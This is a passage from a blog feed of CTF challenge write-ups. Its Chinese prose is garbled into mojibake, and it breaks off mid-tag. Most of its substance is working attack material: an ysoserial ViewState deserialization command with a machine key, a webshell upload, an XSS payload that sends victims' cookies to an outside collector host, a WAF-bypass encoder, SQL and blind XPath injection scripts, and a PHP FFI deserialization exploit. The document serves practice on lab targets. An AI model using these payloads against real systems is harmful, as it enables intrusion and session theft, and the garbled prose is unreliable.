<p>å¾ˆæ˜æ˜¾å°±èƒ½å¤Ÿçœ‹å‡ºè¿™é¢˜æ˜¯æ–‡ä»¶åæ³¨å…¥</p>
<p>è®¿é—®ä¸€ä¸‹å‰é¢ä¸¤ä¸ªè·¯å¾„ï¼Œm4aaannngggeeeæ˜¯çœŸçš„</p>
<img src="/2020/07/04/taoismt/21.png" class="">

<p>åœ¨è¿™é‡Œä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åï¼Œæµ‹è¯•å‘ç°/è¢«è¿‡æ»¤äº†ï¼Œç”¨..ä»£æ›¿</p>
<img src="/2020/07/04/taoismt/22.png" class="">

<h3 id="BJDCTF-2nd-EasyAspDotNet"><a href="#BJDCTF-2nd-EasyAspDotNet" class="headerlink" title="[BJDCTF 2nd]EasyAspDotNet"></a>[BJDCTF 2nd]EasyAspDotNet</h3><p>è¿™é“é¢˜è·Ÿç€èµµæ€»çš„wpåšçš„ï¼Œé“¾æ¥èµ°ä¸€æ³¢ï¼š<a href="https://www.zhaoj.in/read-6497.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6497.html</a></p>
<img src="/2020/07/04/taoismt/23.png" class="">

<p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶è·¯å¾„ï¼Œå°è¯•æ–‡ä»¶ç›®å½•ç©¿è¶Šè¯»å–web.config</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">validationKey</span>=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span> <span class="attr">decryptionKey</span>=<span class="string">"B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5"</span> <span class="attr">validation</span>=<span class="string">"SHA1"</span> <span class="attr">decryption</span>=<span class="string">"3DES"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åç”¨ysoserialç”Ÿæˆpayloadï¼Œå¼€ç®±å³ç”¨<a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡postmanæŠŠç”Ÿæˆçš„payloadèµ‹ç»™__VIEWSTATE</p>
<img src="/2020/07/04/taoismt/24.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>taoisms</title>
    <url>/2020/07/02/taoisms/</url>
    <content><![CDATA[<h3 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker<a id="more"></a></h3><p>å¼€é¢˜ï¼Œæ³¨å†Œç™»å½•ï¼Œè·³è½¬åˆ°ä¸ªäººä¸»é¡µ</p>
<img src="/2020/07/02/taoisms/1.png" class="">

<p>æ‰€æœ‰çš„è¾¹è¾¹æ¡†æ¡†éƒ½ç‚¹ä¸äº†ï¼Œé™¤äº†æ›´æ¢å¤´åƒè¿™ä¸€å—ï¼Œæ–‡ä»¶ä¸Šä¼ æ²¡è·‘äº†</p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œåœ¨å‰ç«¯é¡µé¢å‘ç°äº†ä¸Šä¼ è·¯å¾„ï¼Œè®¿é—®ï¼Œåªèƒ½å‡ºæ¥å›¾ç‰‡ï¼Œæ²¡æœ‰è¢«è§£æï¼Œä¸Šä¼ .htaccessï¼Œä¸è¢«å…è®¸çš„ç±»å‹ï¼ŒburpæŠ“åŒ…æ”¹åç¼€è¯•è¯•</p>
<p>æŠ“åŒ…å†æŠŠåç¼€æ”¹ä¸ºphpæˆåŠŸä¸Šä¼ </p>
<img src="/2020/07/02/taoisms/2.png" class="">

<p>ç›´æ¥ä¸Šèšå‰‘ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagï¼Œæˆ–è€…ç›´æ¥ç½‘é¡µè¯»å–</p>
<img src="/2020/07/02/taoisms/3.png" class="">

<p>å»ºè®®è¿˜æ˜¯ç”¨èšå‰‘ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› æ–‡ä»¶åçš„Fæ— æ³•æ˜¾ç¤º</p>
<img src="/2020/07/02/taoisms/4.png" class="">

<h3 id="CISCN2019-åä¸œåŒ—èµ›åŒº-Web2"><a href="#CISCN2019-åä¸œåŒ—èµ›åŒº-Web2" class="headerlink" title="[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2"></a>[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2</h3><p>è®ºå›å‘å¸–ï¼Œå‘å¸–éœ€è¦æ³¨å†Œï¼Œçœ‹è¿™ä¸ªå‘å¸–çš„å½¢å¼åº”è¯¥æ˜¯xssç±»å‹çš„é¢˜</p>
<p>æ³¨å†Œç™»å½•ï¼Œé¢˜ç›®æœ‰æç¤ºå»åˆ°buuæä¾›çš„xsså¹³å°ï¼Œè¿™è¾¹å¹³å°ä¸Šæœ‰æä¾›é»˜è®¤æ¨¡å—çš„xssé“¾å­ï¼Œä½†æ˜¯å¥½åƒè¿˜æ˜¯ä¸å¤ªèƒ½æ‰“çš„é€šï¼Œçœ‹äº†wpï¼Œç›´æ¥å€Ÿç”¨èµµæ€»çš„xssä»£ç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location.href=<span class="string">'http://xss.buuoj.cn/index.php?do=api&amp;id=drlczi&amp;location='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;toplocation='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> top.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.cookie&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;opener='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span>(<span class="built_in">window</span>.opener&amp;&amp;<span class="built_in">window</span>.opener.location.href)?<span class="built_in">window</span>.opener.location.href:<span class="string">''</span>&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ipéœ€è¦è‡ªå·±æ”¹ä¸€ä¸‹ï¼Œè¿™é‡Œæ³¨æ„åˆ°èµµæ€»çš„wpé‡Œæœ‰è¯´åˆ°è¿™é‡Œæœ‰wafï¼Œéœ€è¦ç”¨åˆ°HTML Markupç¼–ç ï¼Œå®é™…ä¸Šè¿™ç§ç¼–ç æ–¹å¼å°±æ˜¯ç”¨&amp;#+asciiå¯¹åº”çš„å€¼ï¼Œç›´æ¥å€Ÿç”¨èµµæ€»è½¬åŒ–çš„ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">in_str = <span class="string">""</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> in_str:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>

<p>è½¬åŒ–ç»“æœï¼š</p>
<img src="/2020/07/02/taoisms/5.png" class="">

<p>æäº¤ä¹‹åè®¿é—®ä¸€ä¸‹ä¿å­˜çš„é¡µé¢ï¼Œè®°ä¸‹è·¯å¾„</p>
<img src="/2020/07/02/taoisms/7.png" class="">

<p>è¿™é‡Œæœ‰ä¸€ä¸ªMD5çš„ç¢°æ’ï¼Œç”¨ç¢°æ’è„šæœ¬å°±èƒ½å¾ˆå¿«è·‘å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line">ch = string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ch:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ch:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> ch:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> ch :</span><br><span class="line">                str1=str(i)+str(j)+str(k)+str(l)</span><br><span class="line">                a=hashlib.md5(str1.encode(encoding=<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">"2f18b8"</span>:</span><br><span class="line">                    print(str1)</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±å»é‚£ä¸ªxssç½‘ç«™æ”¶ä¸€ä¸‹æ¥æ”¶åˆ°çš„ç®¡ç†å‘˜çš„SESSION</p>
<img src="/2020/07/02/taoisms/8.png" class="">

<p>ç”¨ç®¡ç†å‘˜çš„SESSIONå€¼è¿›è¡Œæ›¿æ¢ï¼ŒæˆåŠŸç™»å½•</p>
<img src="/2020/07/02/taoisms/6.png" class="">

<p>è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªsqlæ³¨å…¥ï¼Œæµ‹è¯•æ²¡æœ‰è¿‡æ»¤ä»»ä½•ä¸œè¥¿ï¼Œç›´æ¥è¿›è¡Œè”åˆæ³¨å…¥æŸ¥è¯¢å³å¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#    #æŸ¥è¡¨ flag,users</span></span><br><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'flag'</span><span class="comment">#   #æŸ¥å­—æ®µ flagg</span></span><br><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(flagg) <span class="keyword">from</span> flag<span class="comment"># #æŸ¥å€¼ï¼ŒæŸ¥åˆ°flag</span></span><br></pre></td></tr></table></figure>

<h3 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h3><p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯é“sqlæ³¨å…¥é¢˜ï¼Œä½†æ˜¯æ€ä¹ˆè¯•éƒ½æ²¡ç”¨ï¼ŒbpæŠ“åŒ…ï¼Œçœ‹åˆ°äº†ä¼ è¿‡å»çš„æ•°æ®å½¢å¼æ˜¯xmlçš„å½¢å¼ï¼ŒçœŸçš„æ˜¯å°¬ä½äº†ï¼Œçœ‹äº†wpæ‰çŸ¥é“æ˜¯xpathç›²æ³¨ï¼Œæ²¡å•¥å¥½è¯´çš„ï¼Œé™„ä¸Šå­¦ä¹ é“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/7791#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/7791#toc-6</a></p>
<p>ç›´æ¥ä¸Šè„šæœ¬å§ï¼Œè¿™é‡Œå› ä¸ºtokençš„æ—¶æ•ˆå¾ˆçŸ­ï¼Œè¦ä¿æŒä¼šè¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url =<span class="string">'http://f2f0fd0b-5efb-43ed-9e9b-9a0c13588c15.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span></span><br><span class="line">&#125;</span><br><span class="line">find =re.compile(<span class="string">'&lt;input type="hidden" id="token" value="(.*?)" /&gt;'</span>)</span><br><span class="line"></span><br><span class="line">strs =<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        <span class="comment">#çŒœæµ‹æ ¹èŠ‚ç‚¹åç§°</span></span><br><span class="line">        payload_1 = <span class="string">"&lt;username&gt;'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#çŒœæµ‹å­èŠ‚ç‚¹åç§°</span></span><br><span class="line">        payload_2 = <span class="string">"&lt;username&gt;'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#çŒœæµ‹accountsçš„èŠ‚ç‚¹</span></span><br><span class="line">        payload_3 =<span class="string">"&lt;username&gt;'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#çŒœæµ‹userèŠ‚ç‚¹</span></span><br><span class="line">        payload_4 =<span class="string">"&lt;username&gt;'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#è·‘ç”¨æˆ·åå’Œå¯†ç </span></span><br><span class="line">        payload_username =<span class="string">"&lt;username&gt;'or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        payload_password =<span class="string">"&lt;username&gt;'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload_username)</span></span><br><span class="line">        r = s.post(url=url,headers=head,data=payload_password)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"éæ³•æ“ä½œ"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)//é˜²æ­¢è®¿é—®è¿‡å¿«æŠ¥é”™</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#è·‘å‡ºæ¥è´¦å·adm1ä½ ã€ï¼Œå¯†ç cf7414b5bdb2e65ee43083f4ddbc4d9fï¼Œè§£å¯†æ˜¯gtfly123</span></span><br></pre></td></tr></table></figure>

<p>ç™»å½•ä¹‹åæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œæºç ç»™äº†æç¤ºflagåœ¨/flagä¸‹</p>
<p>fileä¼ªåè®®è¿›è¡Œè¯»å–ï¼Œå¼¹å‡ºNONONOï¼Œåº”è¯¥æ˜¯æœ‰WAFï¼Œç»è¿‡æµ‹è¯•phpï¼Œread,baseéƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼Œæºç å¤„æ‹¿åˆ°äº†base64åŠ å¯†çš„æ•°æ®</p>
<img src="/2020/07/02/taoisms/9.png" class="">

<h3 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™ä¸ªæºç çš„æ—¶å€™ä¸€ä¹ï¼Œæ„Ÿè§‰æœ‰å¾ˆå¤§çš„æ“ä½œç©ºé—´ï¼Œå…ˆæ¥çœ‹çœ‹phpinfo()é…ç½®æƒ…å†µï¼Œæ”¶é›†ä¿¡æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP Version <span class="number">7.4</span><span class="number">.0</span>-dev</span><br><span class="line"></span><br><span class="line">open_basedirï¼š/<span class="keyword">var</span>/www/html</span><br><span class="line">    </span><br><span class="line">opcache.preloadï¼š/<span class="keyword">var</span>/www/html/preload.php</span><br><span class="line"></span><br><span class="line">å¼€å¯äº†FFI</span><br><span class="line"></span><br><span class="line">disable_functions:set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºåŸºæœ¬ä¸Šæ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«banäº†ï¼Œé‚£å°±æ²¡æƒ³è±¡ä¸­é‚£ä¹ˆç®€å•äº†ï¼Œçœ‹äº†ä¸€ä¸‹var_dumpå’Œscandirè¿˜æ˜¯èƒ½ç”¨çš„ï¼Œé‚£å°±å…ˆæ¥è¯»ä¸€ä¸‹wwwç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<img src="/2020/07/02/taoisms/10.png" class="">

<p>æœ‰ä¸€ä¸ªpreload.phpå¯ä»¥è®¿é—®ï¼Œç”¨show_sourceæˆ–è€…file_get_contentsè¯»å–ä¸€ä¸‹    </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ï¼Œåªè¦ç”¨åˆ°run()å‡½æ•°å°±èƒ½å¤Ÿæ‰§è¡Œprint_r($arg),ä¸‹é¢å°±æ˜¯è§¦åŠåˆ°çŸ¥è¯†ç›²åŒºäº†</p>
<p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> æ˜¯ <strong>PHP7.4</strong> ä¸­æ–°åŠ å…¥çš„åŠŸèƒ½ã€‚å¦‚æœè®¾ç½®äº† <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> ï¼Œé‚£ä¹ˆåœ¨æ‰€æœ‰Webåº”ç”¨ç¨‹åºè¿è¡Œä¹‹å‰ï¼ŒæœåŠ¡ä¼šå…ˆå°†è®¾å®šçš„ <strong>preload</strong> æ–‡ä»¶åŠ è½½è¿›å†…å­˜ä¸­ï¼Œä½¿è¿™äº› <strong>preload</strong> æ–‡ä»¶ä¸­çš„å†…å®¹å¯¹ä¹‹åçš„è¯·æ±‚å‡å¯ç”¨ã€‚æ›´å¤šç»†èŠ‚å¯ä»¥é˜…è¯»ï¼š<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a> ï¼Œå…è®¸åœ¨ <strong>preload</strong> æ–‡ä»¶ä¸­ä½¿ç”¨ <strong>FFI</strong> æ‹“å±•ï¼Œä½†æ˜¯æ–‡æ¡£ä¸­è¯´äº† <strong>FFI</strong> æ˜¯ä¸€ä¸ªå±é™©çš„æ‹“å±•ï¼Œè€Œè¿™é“é¢˜ç›®å´å¼€å¯äº† <strong>FFI</strong> æ‹“å±•ã€‚ä¸‹é¢æ˜¯æ–‡æ¡£é‡Œçš„ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;ï¼Ÿphp </span><br><span class="line"><span class="comment">//åˆ›å»ºFFIå¯¹è±¡ï¼ŒåŠ è½½libcå¹¶å¯¼å‡ºå‡½æ•°printfï¼ˆï¼‰</span></span><br><span class="line">$ ffi  = FFI :: cdef ï¼ˆ</span><br><span class="line">    â€œ int printfï¼ˆ<span class="keyword">const</span> char * formatï¼Œ...ï¼‰;â€ ï¼Œ <span class="comment">//è¿™æ˜¯å¸¸è§„çš„Cå£°æ˜</span></span><br><span class="line">    â€œ libc .so<span class="number">.6</span>â€œ ï¼‰; </span><br><span class="line"><span class="comment">//å‘¼å«C printfï¼ˆï¼‰</span></span><br><span class="line">$ ffi- &gt; printfï¼ˆâ€œ Hello ï¼…sï¼\ n â€ ï¼Œ â€œ worldâ€ ï¼‰;</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œå°±å¯ä»¥æ„é€ expäº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">"int php_exec(int type, char *cmd);"</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span 